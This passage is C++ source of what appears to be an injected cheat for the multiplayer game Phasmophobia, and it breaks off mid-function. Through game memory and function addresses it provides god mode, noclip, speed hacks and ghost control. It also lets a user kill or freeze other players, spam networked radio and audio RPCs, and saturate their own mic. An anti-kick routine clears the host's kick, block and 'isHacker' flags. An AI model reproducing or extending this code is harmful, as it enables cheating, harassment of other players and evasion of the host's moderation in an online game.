    static void HandlePlayerRequests()
    {
        if (PLAYER_RequestTeleport)
        {
            PLAYER_RequestTeleport = false;
            TeleportToSlot(PLAYER_TeleportTarget);
        }

        if (PLAYER_RequestKill)
        {
            PLAYER_RequestKill = false;
            KillSlotPlayer(PLAYER_KillTarget);
        }

        if (PLAYER_RequestFreeze)
        {
            PLAYER_RequestFreeze = false;
            Phasmo::Player* target = ResolvePlayerSlot(PLAYER_FreezeTarget);
            if (target) {
                Phasmo_Call<void>(Phasmo::RVA_Player_ToggleFreezePlayer, target, true, nullptr);
                FreezePlayer(target);
            }
        }

        if (PLAYER_RequestUnfreeze)
        {
            PLAYER_RequestUnfreeze = false;
            Phasmo::Player* target = ResolvePlayerSlot(PLAYER_FreezeTarget);
            if (target) {
                Phasmo_Call<void>(Phasmo::RVA_Player_ToggleFreezePlayer, target, false, nullptr);
                UnfreezePlayer(target);
            }
        }
    }

    static bool EnsureGhostAI(Phasmo::GhostAI*& out)
    {
        out = nullptr;

        if (!IsInGame())
            return false;

        out = Phasmo_GetGhostAI();
        if (!out || !Phasmo_Safe(out, sizeof(Phasmo::GhostAI))) {
            static ULONGLONG lastLog = 0;
            const ULONGLONG now = GetTickCount64();
            if (now - lastLog > 2000) {
                Logger::WriteLine("[Phasmo] GhostAI not ready");
                lastLog = now;
            }
            return false;
        }

        Phasmo::GhostInfo* info = nullptr;
        if (!TryGetGhostInfo(out, info)) {
            static ULONGLONG lastLogInfo = 0;
            const ULONGLONG now = GetTickCount64();
            if (now - lastLogInfo > 2000) {
                Logger::WriteLine("[Phasmo] GhostAI info not ready");
                lastLogInfo = now;
            }
            return false;
        }

        return true;
    }

    static bool EnsureGhostActivity(Phasmo::GhostAI* ghost, void*& activity)
    {
        if (!ghost) return false;
        activity = ghost->ghostActivity;
        if (!Phasmo_Safe(activity, 0x30)) {
            Logger::WriteLine("[Phasmo] GhostActivity missing");
            return false;
        }
        return true;
    }

    using CameraGetMainFn = UnityEngine_Camera_o* (*)(const MethodInfo*);
    using CameraGetFieldOfViewFn = float (*)(UnityEngine_Camera_o*, const MethodInfo*);
    using CameraSetFieldOfViewFn = void (*)(UnityEngine_Camera_o*, float, const MethodInfo*);

    struct CameraFns
    {
        CameraGetMainFn getMain = nullptr;
        CameraGetFieldOfViewFn getFov = nullptr;
        CameraSetFieldOfViewFn setFov = nullptr;
        bool resolved = false;
    };

    static CameraFns s_cameraFns;
    static bool s_prevFovEditor = false;
    static float s_savedFov = 60.0f;

    static bool EnsureCameraFns()
    {
        if (s_cameraFns.resolved) return true;
        uintptr_t base = Phasmo_Base();
        if (!base) return false;
        s_cameraFns.getMain = reinterpret_cast<CameraGetMainFn>(base + Phasmo::RVA_Camera_get_main);
        s_cameraFns.getFov = reinterpret_cast<CameraGetFieldOfViewFn>(base + Phasmo::RVA_Camera_get_fieldOfView);
        s_cameraFns.setFov = reinterpret_cast<CameraSetFieldOfViewFn>(base + Phasmo::RVA_Camera_set_fieldOfView);
        s_cameraFns.resolved = s_cameraFns.getMain && s_cameraFns.getFov && s_cameraFns.setFov;
        return s_cameraFns.resolved;
    }

    static UnityEngine_Camera_o* GetMainCamera()
    {
        if (!EnsureCameraFns()) return nullptr;
        return s_cameraFns.getMain(nullptr);
    }

    static void* GetMainCameraTransform()
    {
        UnityEngine_Camera_o* camera = GetMainCamera();
        if (!camera)
            return nullptr;

        void* transform = Phasmo_Call<void*>(Phasmo::RVA_UnityEngine_Component_get_transform, camera, nullptr);
        return (transform && Phasmo_Safe(transform, 0xC0)) ? transform : nullptr;
    }

    static void* GetLocalPlayerCameraTransform()
    {
        if (!s_localPlayer || !Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player)))
            return nullptr;

        void* camera = s_localPlayer->camera;
        if (!camera || !Phasmo_Safe(camera, 0x40))
            return nullptr;

        void* transform = Phasmo_Call<void*>(Phasmo::RVA_UnityEngine_Component_get_transform, camera, nullptr);
        return (transform && Phasmo_Safe(transform, 0x20)) ? transform : nullptr;
    }

    static float QueryMainCameraFov(UnityEngine_Camera_o* camera)
    {
        if (!camera || !s_cameraFns.getFov) return 60.0f;
        return s_cameraFns.getFov(camera, nullptr);
    }

    static void SetMainCameraFov(UnityEngine_Camera_o* camera, float value)
    {
        if (!camera || !s_cameraFns.setFov) return;
        s_cameraFns.setFov(camera, value, nullptr);
    }

    static void ApplyFovEditor()
    {
        if (!Cheat::PLAYER_FovEditor && !s_prevFovEditor)
            return;

        UnityEngine_Camera_o* camera = GetMainCamera();
        if (!camera)
            return;

        if (Cheat::PLAYER_FovEditor)
        {
            if (!s_prevFovEditor)
            {
                s_savedFov = QueryMainCameraFov(camera);
                s_prevFovEditor = true;
            }
            SetMainCameraFov(camera, Cheat::PLAYER_FovValue);
        }
        else if (s_prevFovEditor)
        {
            SetMainCameraFov(camera, s_savedFov);
            s_prevFovEditor = false;
        }
    }

    static int ResolveWeatherEnum(int uiIndex)
    {
        switch (uiIndex)
        {
        case 0: return 0; // clear
        case 1: return 1; // light fog -> foggy
        case 2: return 1; // heavy fog -> foggy
        case 3: return 2; // light rain
        case 4: return 3; // heavy rain
        case 5: return 4; // light snow
        case 6: return 4; // heavy snow
        case 7: return 5; // blizzard -> wind
        default: return 0;
        }
    }

    static void ApplyWeatherControl()
    {
        static int s_lastWeatherIndex = -1;

        if (!GHOST_WeatherEnabled) {
            s_lastWeatherIndex = -1;
            return;
        }

        if (GHOST_WeatherIndex == s_lastWeatherIndex)
            return;

        Phasmo::RandomWeather* randomWeather = Phasmo_GetRandomWeather();
        if (!randomWeather || !Phasmo_Safe(randomWeather, sizeof(Phasmo::RandomWeather)))
            return;

        const int weatherEnum = ResolveWeatherEnum(GHOST_WeatherIndex);
        Phasmo_Call<void>(Phasmo::RVA_RandomWeather_SetWeatherProfile, randomWeather, weatherEnum, nullptr);

        if (Phasmo::LevelValues* values = Phasmo_GetLevelValues()) {
            if (values->currentDifficulty && Phasmo_Safe(values->currentDifficulty, sizeof(Phasmo::Difficulty)))
                values->currentDifficulty->weather = weatherEnum;
        }

        s_lastWeatherIndex = GHOST_WeatherIndex;
    }

    static void ApplyGhostStateSelection()
    {
        static int s_lastForcedState = -1;

        if (!GHOST_ForceStateEnabled) {
            s_lastForcedState = -1;
            return;
        }

        if (GHOST_ForceStateIndex == s_lastForcedState)
            return;

        Phasmo::GhostAI* ghost = nullptr;
        if (!EnsureGhostAI(ghost))
            return;

        static const int kStateMap[] = { 0, 1, 2, 3, 4, 5 };
        const int idx = std::clamp(GHOST_ForceStateIndex, 0, static_cast<int>(std::size(kStateMap)) - 1);
        Phasmo_Call<void>(Phasmo::RVA_GhostAI_ChangeState, ghost, kStateMap[idx], nullptr, false, nullptr);
        s_lastForcedState = GHOST_ForceStateIndex;
    }

    // ══════════════════════════════════════════════════════
    //  PLAYER: GOD MODE
    //  Sets sanity to max, prevents death
    // ══════════════════════════════════════════════════════
    static void ApplyGodMode()
    {
        static uint64_t s_lastReviveAttemptTick = 0;

        if (!PLAYER_GodMode) return;
        if (!s_localPlayer) return;

        __try {
            Phasmo::PlayerSanity* ps = Phasmo_GetPlayerSanity(s_localPlayer);
            if (!ps) return;

            // Keep sanity maxed without constantly forcing a revive path every frame.
            Phasmo_Call<void>(Phasmo::RVA_PlayerSanity_SetInsanity, ps, 100, nullptr);

            ps->sanity = 100.0f;
            ps->sanityInternalA = 100.0f;
            ps->sanityInternalB = 100.0f;

            if (s_localPlayer->isDead) {
                const uint64_t now = GetTickCount64();
                if (now - s_lastReviveAttemptTick >= 1500) {
                    s_lastReviveAttemptTick = now;
                    Phasmo_Call<void>(Phasmo::RVA_Player_RevivePlayer, s_localPlayer, false, nullptr);
                }
            } else {
                s_lastReviveAttemptTick = 0;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  PLAYER: SET SANITY
    // ══════════════════════════════════════════════════════
    static void ApplySetSanity()
    {
        if (!PLAYER_SetSanity) return;
        if (!s_localPlayer) return;

        __try {
            Phasmo::PlayerSanity* ps = Phasmo_GetPlayerSanity(s_localPlayer);
            if (!ps) return;

            // Use SetInsanity (networked, int 0-100) for proper game sync
            int sanityInt = static_cast<int>(PLAYER_SanityValue);
            Phasmo_Call<void>(Phasmo::RVA_PlayerSanity_SetInsanity, ps, sanityInt, nullptr);

            // Also write raw fields
            ps->sanity = PLAYER_SanityValue;
            ps->sanityInternalA = PLAYER_SanityValue;
            ps->sanityInternalB = PLAYER_SanityValue;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplySuicide()
    {
        if (!PLAYER_RequestSuicide)
            return;

        PLAYER_RequestSuicide = false;
        if (!s_localPlayer)
            return;

        __try {
            // Use the game's death routine without spawning a body.
            Phasmo_Call<void>(Phasmo::RVA_Player_DeadRoomEffects, s_localPlayer, nullptr);
            Phasmo_Call<void>(Phasmo::RVA_Player_Dead, s_localPlayer, nullptr, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyMovementTeleport()
    {
        if (!MOV_Teleport)
            return;

        MOV_Teleport = false;
        TeleportToSlot(PLAYER_TeleportTarget);
    }

    static void ApplyRadioSpamNetwork()
    {
        static ULONGLONG s_nextToggleAt = 0;
        static bool s_radioEnabled = false;

        if (!PLAYER_RadioSpamNetwork) {
            s_nextToggleAt = 0;
            s_radioEnabled = false;
            return;
        }

        if (!s_localPlayer || !GetLocalWalkieTalkie())
            return;

        const int delayMs = std::max(25, PLAYER_RadioSpamDelayMs);
        const ULONGLONG now = GetTickCount64();
        if (now < s_nextToggleAt)
            return;

        const bool rpcOk = TryWalkieRpc(s_radioEnabled ? "TurnOff" : "TurnOn");
        if (!rpcOk) {
            Phasmo::WalkieTalkie* walkie = GetLocalWalkieTalkie();
            if (!walkie)
                return;

            if (s_radioEnabled)
                Phasmo_Call<void>(Phasmo::RVA_WalkieTalkie_Stop, walkie, nullptr);
            else
                Phasmo_Call<void>(Phasmo::RVA_WalkieTalkie_Use, walkie, nullptr);
        }

        s_radioEnabled = !s_radioEnabled;
        s_nextToggleAt = now + static_cast<ULONGLONG>(delayMs);
    }

    static void ApplyMicSaturation()
    {
        static bool s_restorePending = false;

        Phasmo::PlayerAudio* audio = GetLocalPlayerAudio();
        if (!audio)
            return;

        if (!PLAYER_MicSaturation) {
            if (s_restorePending) {
                Phasmo_Call<void>(Phasmo::RVA_PlayerAudio_SetVolume, audio, 1.0f, false, nullptr);
                s_restorePending = false;
            }
            return;
        }

        const float saturationVolume = std::clamp(PLAYER_MicSaturationVolume, 1.0f, 8.0f);
        Phasmo_Call<void>(Phasmo::RVA_PlayerAudio_SetVolume, audio, saturationVolume, false, nullptr);
        s_restorePending = true;
    }

    static void ApplyHearDeadPlayers()
    {
        static ULONGLONG s_nextApplyAt = 0;

        if (!PLAYER_HearDeadPlayers) {
            s_nextApplyAt = 0;
            return;
        }

        const ULONGLONG now = GetTickCount64();
        if (now < s_nextApplyAt)
            return;
        s_nextApplyAt = now + 500;

        Il2CppListPlayer* list = QueryMapPlayerList();
        if (!list || list->_size <= 0 || list->_size > 32)
            return;

        using Fn = void (*)(void*, bool, const void*);
        static Fn toggleMuteAllFn = nullptr;
        if (!toggleMuteAllFn)
            toggleMuteAllFn = reinterpret_cast<Fn>(Phasmo_Base() + Phasmo::RVA_PlayerAudio_ToggleMuteAllChannels);
        if (!toggleMuteAllFn)
            return;

        for (int32_t i = 0; i < list->_size; ++i) {
            Phasmo::Player* player = GetMapPlayerAt(list, i);
            if (!player || player == s_localPlayer || !Phasmo_Safe(player, sizeof(Phasmo::Player)))
                continue;
            if (!player->isDead)
                continue;

            Phasmo::PlayerAudio* audio = GetPlayerAudio(player);
            if (!audio)
                continue;

            __try {
                toggleMuteAllFn(audio, false, nullptr);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
    }

    static int GetTruckRadioClipCount(Phasmo::TruckRadioController* controller, int category)
    {
        if (!controller)
            return 0;

        Phasmo::Il2CppArray* clips = nullptr;
        switch (category) {
        case 0: clips = controller->introductionClips; break;
        case 1: clips = controller->keyWarningClips; break;
        case 2: clips = controller->noHintClips; break;
        case 3: clips = controller->aggressiveHintClips; break;
        case 4: clips = controller->friendlyHintClips; break;
        case 5: clips = controller->nonFriendlyHintClips; break;
        case 6: clips = controller->cursedPossessionsClips; break;
        default: return 0;
        }

        if (!clips || !Phasmo_Safe(clips, Phasmo::ARRAY_FIRST_ELEMENT))
            return 0;
        if (clips->max_length <= 0 || clips->max_length > 64)
            return 0;
        return clips->max_length;
    }

    static void ApplyTruckRadioSpamNetwork()
    {
        static ULONGLONG s_nextTruckRadioAt = 0;

        if (!PLAYER_TruckRadioSpamNetwork) {
            s_nextTruckRadioAt = 0;
            return;
        }

        Phasmo::TruckRadioController* controller = GetTruckRadioController();
        if (!controller || !controller->view)
            return;

        const ULONGLONG now = GetTickCount64();
        const int delayMs = std::max(100, PLAYER_TruckRadioSpamDelayMs);
        if (now < s_nextTruckRadioAt)
            return;

        const int category = std::clamp(PLAYER_TruckRadioCategory, 0, 6);
        const int clipCount = GetTruckRadioClipCount(controller, category);
        int clipIndex = 0;
        if (clipCount > 0) {
            if (PLAYER_TruckRadioRandomClip)
                clipIndex = static_cast<int>(now % static_cast<ULONGLONG>(clipCount));
            else
                clipIndex = std::clamp(PLAYER_TruckRadioClipIndex, 0, clipCount - 1);
        }

        if (TryTruckRadioRpc(category, clipIndex))
            s_nextTruckRadioAt = now + static_cast<ULONGLONG>(delayMs);
    }

    // ══════════════════════════════════════════════════════
    //  MOVEMENT: INFINITY STAMINA
    //  Prevents stamina drain
    // ══════════════════════════════════════════════════════
    static void ApplyInfinityStamina()
    {
        static bool s_hasSavedBaseSpeed = false;
        static float s_savedBaseSpeed = 1.0f;

        auto restoreSprintTuning = [&]() {
            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (!values || !Phasmo_Safe(values, sizeof(Phasmo::LevelValues)))
                return;

            Phasmo::Difficulty* diff = values->currentDifficulty;
            if (!diff || !Phasmo_Safe(diff, sizeof(Phasmo::Difficulty)))
                return;

            if (s_hasSavedBaseSpeed && !MOV_CustomSpeed)
                diff->playerSpeed = s_savedBaseSpeed;
            s_hasSavedBaseSpeed = false;
        };

        if (!MOV_InfinityStamina) {
            restoreSprintTuning();
            return;
        }
        if (!s_localPlayer) return;

        __try {
            Phasmo::PlayerStamina* pst = Phasmo_GetPlayerStamina(s_localPlayer);
            if (!pst) return;

            // Keep stamina full without killing sprint state.
            pst->staminaValue = 1.0f;
            if (pst->staminaRecover < 1.0f)
                pst->staminaRecover = 1.0f;
            if (pst->staminaDrain < 0.0f)
                pst->staminaDrain = 0.0f;

            // The game's helper is safer than forcing walk/sprint flags every frame.
            // Calling this repeatedly while shift is held keeps sprint usable.
            if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
                Phasmo_Call<void>(Phasmo::RVA_PlayerStamina_PreventDrainForTime, pst, 0.75f, nullptr);

            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (!values || !Phasmo_Safe(values, sizeof(Phasmo::LevelValues)))
                return;

            Phasmo::Difficulty* diff = values->currentDifficulty;
            if (!diff || !Phasmo_Safe(diff, sizeof(Phasmo::Difficulty)))
                return;

            if (!MOV_CustomSpeed) {
                if (!s_hasSavedBaseSpeed) {
                    s_savedBaseSpeed = diff->playerSpeed > 0.0f ? diff->playerSpeed : 1.0f;
                    s_hasSavedBaseSpeed = true;
                }

                const bool sprintHeld = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                diff->playerSpeed = sprintHeld ? std::max(1.35f, s_savedBaseSpeed * 1.65f) : s_savedBaseSpeed;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MOVEMENT: CUSTOM SPEED
    //  Modifies player movement speed
    // ══════════════════════════════════════════════════════
    static void ApplyCustomSpeed()
    {
        if (!s_localPlayer) return;

        __try {
            static bool s_hasSavedSpeed = false;
            static float s_savedSpeed = 1.0f;

            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (!values || !Phasmo_Safe(values, sizeof(Phasmo::LevelValues)))
                return;

            Phasmo::Difficulty* diff = values->currentDifficulty;
            if (!diff || !Phasmo_Safe(diff, sizeof(Phasmo::Difficulty)))
                return;
            if (!MOV_CustomSpeed) {
                if (s_hasSavedSpeed) {
                    diff->playerSpeed = s_savedSpeed;
                    if (Phasmo::RVA_Player_SetPlayerSpeed)
                        Phasmo_Call<void>(Phasmo::RVA_Player_SetPlayerSpeed, s_localPlayer, s_savedSpeed, nullptr);
                    s_hasSavedSpeed = false;
                }
                return;
            }

            if (!s_hasSavedSpeed) {
                s_savedSpeed = diff->playerSpeed;
                s_hasSavedSpeed = true;
            }

            const float speed = std::max(0.25f, MOV_SpeedValue);
            diff->playerSpeed = speed;
            if (Phasmo::RVA_Player_SetPlayerSpeed)
                Phasmo_Call<void>(Phasmo::RVA_Player_SetPlayerSpeed, s_localPlayer, speed, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MOVEMENT: FREECAM
    //  Local camera-only fly mode
    // ══════════════════════════════════════════════════════
    static void ApplyFreecam()
    {
        static bool s_freecamActive = false;
        static Phasmo::Vec3 s_savedCameraPos{};
        static Phasmo::Vec3 s_savedBodyPos{};
        static void* s_savedBodyTransform = nullptr;
        static bool s_bodyFreezeApplied = false;

        auto deactivate = [&]() {
            if (s_freecamActive) {
                void* cameraTransform = GetMainCameraTransform();
                if (cameraTransform)
                    Phasmo_SetPosition(cameraTransform, s_savedCameraPos);
                if (s_savedBodyTransform)
                    Phasmo_SetPosition(s_savedBodyTransform, s_savedBodyPos);
                if (s_localPlayer && s_bodyFreezeApplied && Phasmo::RVA_Player_ToggleFreezePlayer)
                    Phasmo_Call<void>(Phasmo::RVA_Player_ToggleFreezePlayer, s_localPlayer, false, nullptr);
            }
            s_savedBodyTransform = nullptr;
            s_bodyFreezeApplied = false;
            s_freecamActive = false;
        };

        if (!MOV_Freecam || !IsInGame()) {
            deactivate();
            return;
        }

        void* cameraTransform = GetMainCameraTransform();
        if (!cameraTransform)
            return;

        if (!s_freecamActive) {
            s_savedCameraPos = Phasmo_GetPosition(cameraTransform);
            s_savedBodyTransform = GetPlayerCharacterTransform(s_localPlayer);
            if (s_savedBodyTransform)
                s_savedBodyPos = Phasmo_GetPosition(s_savedBodyTransform);
            if (s_localPlayer && Phasmo::RVA_Player_ToggleFreezePlayer) {
                Phasmo_Call<void>(Phasmo::RVA_Player_ToggleFreezePlayer, s_localPlayer, true, nullptr);
                s_bodyFreezeApplied = true;
            }
            s_freecamActive = true;
        }

        Quaternion rot{};
        if (!ReadTransformRotation(cameraTransform, rot))
            rot = { 0.0f, 0.0f, 0.0f, 1.0f };

        Phasmo::Vec3 forward = QuaternionForward(rot);
        Phasmo::Vec3 right = QuaternionRight(rot);
        Phasmo::Vec3 up{ 0.0f, 1.0f, 0.0f };

        Phasmo::Vec3 direction{};
        if (GetAsyncKeyState('W') & 0x8000) direction = V3Add(direction, forward);
        if (GetAsyncKeyState('S') & 0x8000) direction = V3Sub(direction, forward);
        if (GetAsyncKeyState('D') & 0x8000) direction = V3Add(direction, right);
        if (GetAsyncKeyState('A') & 0x8000) direction = V3Sub(direction, right);
        if ((GetAsyncKeyState(VK_SPACE) | GetAsyncKeyState('E')) & 0x8000) direction = V3Add(direction, up);
        if ((GetAsyncKeyState(VK_CONTROL) | GetAsyncKeyState('Q')) & 0x8000) direction = V3Sub(direction, up);

        float length = V3Length(direction);
        if (length <= 0.001f)
            return;

        direction = V3Scale(direction, 1.0f / length);

        float speed = std::max(1.0f, Cheat::MOV_FreecamSpeed);
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
            speed *= 2.35f;
        if (GetAsyncKeyState(VK_MENU) & 0x8000)
            speed *= 0.35f;

        float dt = std::clamp(GetNoClipDeltaTime(), 1.0f / 240.0f, 0.05f);
        Phasmo::Vec3 origin = Phasmo_GetPosition(cameraTransform);
        Phasmo::Vec3 target = V3Add(origin, V3Scale(direction, speed * dt));
        Phasmo_SetPosition(cameraTransform, target);
    }

    // ══════════════════════════════════════════════════════
    //  MOVEMENT: NOCLIP
    //  Walk through walls
    // ══════════════════════════════════════════════════════
    static void ApplyNoClip()
    {
        static bool s_noClipActive = false;
        static void* s_noClipController = nullptr;

        auto restoreController = [&]() {
            if (s_noClipActive && s_noClipController && Phasmo_Safe(s_noClipController, 0x40)) {
                Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Behaviour_set_enabled, s_noClipController, true, nullptr);
                if (Phasmo_Safe(s_noClipController, 0xE8)) {
                    void* collider = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(s_noClipController) + 0xE0);
                    if (collider && Phasmo_Safe(collider, 0x20))
                        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Behaviour_set_enabled, collider, true, nullptr);
                }
            }
            s_noClipActive = false;
            s_noClipController = nullptr;
        };

        if (MOV_Freecam) {
            restoreController();
            return;
        }

        if (!MOV_NoClip || !IsInGame() || !s_localPlayer) {
            restoreController();
            return;
        }

        const int mode = MOV_NoClipMode;
        const bool disableController = true;
        const bool doTeleport = (mode == 0 || mode == 1);
        const bool doTransform = true;

        void* physCtrl = s_localPlayer->physicsCharController;
        if (disableController && physCtrl && Phasmo_Safe(physCtrl, 0x40)) {
            if (!s_noClipActive || physCtrl != s_noClipController) {
                Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Behaviour_set_enabled, physCtrl, false, nullptr);
                if (Phasmo_Safe(physCtrl, 0xE8)) {
                    void* collider = *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(physCtrl) + 0xE0);
                    if (collider && Phasmo_Safe(collider, 0x20))
                        Phasmo_Call<void>(Phasmo::RVA_UnityEngine_Behaviour_set_enabled, collider, false, nullptr);
                }
                s_noClipActive = true;
                s_noClipController = physCtrl;
            }
        }

        void* character = GetPlayerCharacterTransform(s_localPlayer);
        if (!character)
            return;
        void* playerCameraTransform = GetLocalPlayerCameraTransform();

        void* basisTransform = GetMainCameraTransform();
        if (!basisTransform)
            basisTransform = character;

        Quaternion rot{};
        if (!ReadTransformRotation(basisTransform, rot))
            rot = { 0.0f, 0.0f, 0.0f, 1.0f };

        Phasmo::Vec3 forward = QuaternionForward(rot);
        Phasmo::Vec3 right = QuaternionRight(rot);
        if (fabsf(forward.x) > 0.0001f || fabsf(forward.z) > 0.0001f) {
            forward.y = 0.0f;
            forward = V3Normalized(forward);
        }
        right.y = 0.0f;
        right = V3Normalized(right);

        Phasmo::Vec3 direction{};
        if (GetAsyncKeyState('W') & 0x8000) direction = V3Add(direction, forward);
        if (GetAsyncKeyState('S') & 0x8000) direction = V3Sub(direction, forward);
        if (GetAsyncKeyState('D') & 0x8000) direction = V3Add(direction, right);
        if (GetAsyncKeyState('A') & 0x8000) direction = V3Sub(direction, right);
        if ((GetAsyncKeyState(VK_SPACE) | GetAsyncKeyState('E')) & 0x8000) direction.y += 1.0f;
        if ((GetAsyncKeyState(VK_CONTROL) | GetAsyncKeyState('Q')) & 0x8000) direction.y -= 1.0f;

        float length = V3Length(direction);
        if (length <= 0.001f)
            return;

        direction = V3Scale(direction, 1.0f / length);

        float speed = Cheat::MOV_CustomSpeed
            ? std::max(1.0f, 7.5f * Cheat::MOV_SpeedValue)
            : 8.5f;
        if (mode == 1)
            speed *= 0.70f;
        else if (mode == 2)
            speed *= 1.35f;
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
            speed *= 2.35f;
        if (GetAsyncKeyState(VK_MENU) & 0x8000)
            speed *= 0.35f;

        float dt = std::clamp(GetNoClipDeltaTime(), 1.0f / 240.0f, 0.05f);
        Phasmo::Vec3 delta = V3Scale(direction, speed * dt);
        Phasmo::Vec3 origin = Phasmo_GetPosition(character);
        Phasmo::Vec3 target = V3Add(origin, delta);
        if (doTransform) {
            Phasmo_SetPosition(character, target);
            if (playerCameraTransform)
                Phasmo_SetPosition(playerCameraTransform, target);
        }
        if (doTeleport)
            Phasmo_Call<void>(Phasmo::RVA_Player_Teleport, s_localPlayer, target, nullptr);
    }

    // ══════════════════════════════════════════════════════
    //  GHOST: CUSTOM SPEED
    // ══════════════════════════════════════════════════════
    static void ApplyGhostCustomSpeed()
    {
        if (!GHOST_CustomSpeed) return;

        __try {
            Phasmo::GhostAI* ghost = Phasmo_GetGhostAI();
            if (!ghost) return;

            Phasmo::NavMeshAgent* nav = ghost->navMeshAgent;
            if (!Phasmo_Safe(nav, 0x20)) return;

            // Use Il2Cpp NavMeshAgent.set_speed(float) method
            Phasmo_Call<void>(Phasmo::RVA_NavMeshAgent_set_speed, nav, GHOST_SpeedValue, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  GHOST: FORCE ABILITY (via GhostActivity)
    // ══════════════════════════════════════════════════════
    static void ApplyForceAbility()
    {
        if (!GHOST_ForceAbility) return;

        __try {
            Phasmo::GhostAI* ghost = nullptr;
            if (!EnsureGhostAI(ghost))
                return;

            void* activity = nullptr;
            if (!EnsureGhostActivity(ghost, activity))
                return;

            Phasmo_Call<void>(Phasmo::RVA_GhostActivity_GhostAbility, activity, nullptr);
            GHOST_ForceAbility = false;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  GHOST: FORCE INTERACT
    // ══════════════════════════════════════════════════════
    static void ApplyForceInteract()
    {
        if (!GHOST_ForceInteract && !GHOST_ForceInteractDoor && !GHOST_ForceInteractProp
            && !GHOST_ForceNormalInteraction && !GHOST_ForceTwinInteraction)
            return;

        __try {
            Phasmo::GhostAI* ghost = nullptr;
            if (!EnsureGhostAI(ghost))
                return;

            void* activity = nullptr;
            if (!EnsureGhostActivity(ghost, activity))
                return;

            if (GHOST_ForceInteract) {
                Phasmo_Call<void>(Phasmo::RVA_GhostActivity_TryInteract, activity, nullptr);
                // Fallback path: in some contracts TryInteract no-ops, NormalInteraction still triggers.
                Phasmo_Call<void>(Phasmo::RVA_GhostActivity_NormalInteraction, activity, true, nullptr);
                GHOST_ForceInteract = false;
            }
            if (GHOST_ForceInteractDoor) {
                Phasmo_Call<bool>(Phasmo::RVA_GhostActivity_InteractWithARandomDoor, activity, nullptr);
                GHOST_ForceInteractDoor = false;
            }
            if (GHOST_ForceInteractProp) {
                Phasmo_Call<void>(Phasmo::RVA_GhostActivity_InteractWithARandomProp, activity, true, nullptr);
                GHOST_ForceInteractProp = false;
            }
            if (GHOST_ForceNormalInteraction) {
                Phasmo_Call<void>(Phasmo::RVA_GhostActivity_NormalInteraction, activity, true, nullptr);
                GHOST_ForceNormalInteraction = false;
            }
            if (GHOST_ForceTwinInteraction) {
                Phasmo_Call<void>(Phasmo::RVA_GhostActivity_TwinInteraction, activity, true, nullptr);
                GHOST_ForceTwinInteraction = false;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  GHOST: AUDIO (LOCAL)
    // ══════════════════════════════════════════════════════
    static void ApplyGhostAudio()
    {
        if (!GHOST_PlayAudio && !GHOST_StopAudio)
            return;

        __try {
            Phasmo::GhostAI* ghost = Phasmo_GetGhostAI();
            if (!Phasmo_Safe(ghost, sizeof(Phasmo::GhostAI)))
                return;

            Phasmo::GhostAudio* audio = ghost->ghostAudio;
            if (!Phasmo_Safe(audio, sizeof(Phasmo::GhostAudio)))
                return;

            auto tryBroadcast = [&](const char* method, int* index) -> bool {
                if (!GHOST_AudioBroadcast)
                    return false;
                if (!audio->photonView || !Phasmo_Safe(audio->photonView, 0x40))
                    return false;

                Il2CppString* methodName = Phasmo_StringNew(method);
                if (!methodName)
                    return false;

                Phasmo::Il2CppArray* args = nullptr;
                if (index) {
                    args = Phasmo_NewObjectArray(1);
                    Il2CppObject* boxed = Phasmo_BoxInt32(*index);
                    if (!args || !boxed || !Phasmo_ArraySetObject(args, 0, boxed))
                        return false;
                }

                Phasmo_Call<void>(Phasmo::RVA_PV_RPC, audio->photonView, methodName, Phasmo::RPC_ALL, args, nullptr);
                return true;
            };

            if (GHOST_PlayAudio) {
                GHOST_PlayAudio = false;
                int idx = std::clamp(GHOST_AudioIndex, 0, 40);
                if (!tryBroadcast("PlaySoundNetworked", &idx))
                    Phasmo_Call<void>(Phasmo::RVA_GhostAudio_PlaySound, audio, idx, nullptr);
            }

            if (GHOST_StopAudio) {
                GHOST_StopAudio = false;
                if (!tryBroadcast("StopSoundNetworked", nullptr))
                    Phasmo_Call<void>(Phasmo::RVA_GhostAudio_StopSound, audio, nullptr);
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MORE: ANTI-KICK
    //  Prevents host from kicking
    // ══════════════════════════════════════════════════════
    static void ApplyAntiKick()
    {
        if (!MORE_AntiKick) return;

        __try {
            EnsureLocalPlayer();
            Phasmo::NetworkPlayerSpot* spot = GetLocalNetworkSpot();
            if (!spot)
                spot = GetPlayerSpot(s_localPlayer);
            if (!spot)
                return;

            spot->isKicked = false;
            spot->isBlocked = false;
            spot->playerIsBlocked = false;
            spot->isHacker = false;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MORE: GRAB ALL KEYS
    // ══════════════════════════════════════════════════════
    static void ApplyGrabAllKeys()
    {
        if (!MORE_GrabAllKeys) return;
        MORE_GrabAllKeys = false; // one-shot

        if (!IsInGame())
            return;

        const ULONGLONG nowMs = GetTickCount64();
